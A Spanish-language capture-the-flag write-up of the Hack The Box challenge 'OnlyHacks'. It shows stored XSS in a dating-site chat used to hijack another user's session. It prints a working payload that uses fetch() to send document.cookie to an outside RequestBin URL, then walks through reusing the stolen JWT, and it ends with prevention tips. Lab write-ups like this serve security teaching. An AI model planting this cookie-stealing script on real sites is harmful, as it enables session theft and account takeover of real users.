
# OnlyHacks – Hack The Box

![](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/HTB-XSS.jpg)

**Categoría:** Challenges  
**Fecha:** Abril 4, 2025

---

## Descripción General

Este reto de Hack The Box simula una red social de citas. A través de una vulnerabilidad XSS (Cross-Site Scripting), logramos robar la sesión de otro usuario y obtener la flag final del reto.

---

## Accediendo a la Página

Iniciamos la máquina y HTB nos entrega el siguiente host:

```
94.237.63.165:32414
```

Pegamos el host en el navegador y se abre una red social de citas. Nos registramos con un usuario cualquiera y accedemos a la plataforma.

---

## Explorando la Aplicación

Al iniciar sesión, vemos perfiles para hacer "match". Hacemos match con una usuaria llamada **Renata** y comenzamos a chatear con ella.

---

## Prueba de XSS

Probamos si el campo de chat es vulnerable a XSS con un payload básico:

```html
<script>alert(0)</script>
```

El mensaje se ejecuta, lo que confirma que el chat es vulnerable a **XSS reflejado o almacenado**.

---

## Revisión del JWT

Inspeccionamos la aplicación (F12) y en la sección de almacenamiento encontramos una cookie con un **JWT (JSON Web Token)**. Este token mantiene la sesión activa del usuario.

Si robamos este token, podemos suplantar la identidad de otro usuario.

---

## Preparando el Ataque XSS con RequestBin

Usamos [RequestBin](https://requestbin.whapi.cloud/) para generar un endpoint que reciba las cookies robadas.

Ejemplo de URL generada por RequestBin:

```
http://requestbin.whapi.cloud/1iavnfa1
```

Luego, enviamos el siguiente payload XSS a Renata por el chat:

```html
<script>
fetch("http://requestbin.whapi.cloud/1iavnfa1?cookie=" + document.cookie);
</script>
```

### ¿Qué hace este script?

- **document.cookie**: Obtiene todas las cookies del navegador.
- **fetch()**: Envía una petición GET a nuestra URL con las cookies robadas como parámetro.

---

## Robando la Cookie de Renata

Cuando Renata abre el mensaje, su navegador ejecuta el script y su cookie llega a nuestro RequestBin.

Ahí podemos ver su JWT, que copiamos y usamos en nuestro navegador:

1. F12 > Almacenamiento > Cookies.
2. Sustituimos nuestro JWT por el de Renata.
3. Recargamos la página.

Ahora estamos autenticados como **Renata**.

---

## Obteniendo la Flag

Una vez dentro de la cuenta de Renata, abrimos su chat con otro usuario llamado **Dimitris**. En esa conversación encontramos la **flag final** del reto.

---

## Conclusiones

Este reto demuestra lo peligroso que puede ser un XSS si no se controla a tiempo. Con una simple línea de código es posible robar sesiones y acceder a información privada.

### ¿Cómo prevenirlo?

- **Sanitización de entradas**: No permitir que los usuarios inserten scripts en los campos.
- **Cookies HttpOnly**: Impiden que JavaScript acceda a las cookies.
- **SameSite Cookies**: Restringen el uso de cookies en peticiones entre sitios.

---

## Herramientas Utilizadas

- Navegador + Herramientas de desarrollador.
- RequestBin para capturar cookies.
- Payloads XSS básicos.

---

## Aprendizajes

- Cómo detectar y explotar una vulnerabilidad XSS.
- Cómo robar una sesión utilizando JWT.
- Cómo usar herramientas como RequestBin para capturar datos.

---

⚠ **Este material es solo para aprendizaje y CTFs legales. No lo uses en sistemas sin autorización.**
---

**En mi pagina web (Blog) subo las maquinas y/o challenges más a detalle, normalmento lo hago primero alla por quien guste puede checarlo de aquel lado tambien.** 

https://elyoxsecurity.com/category/maquinas/
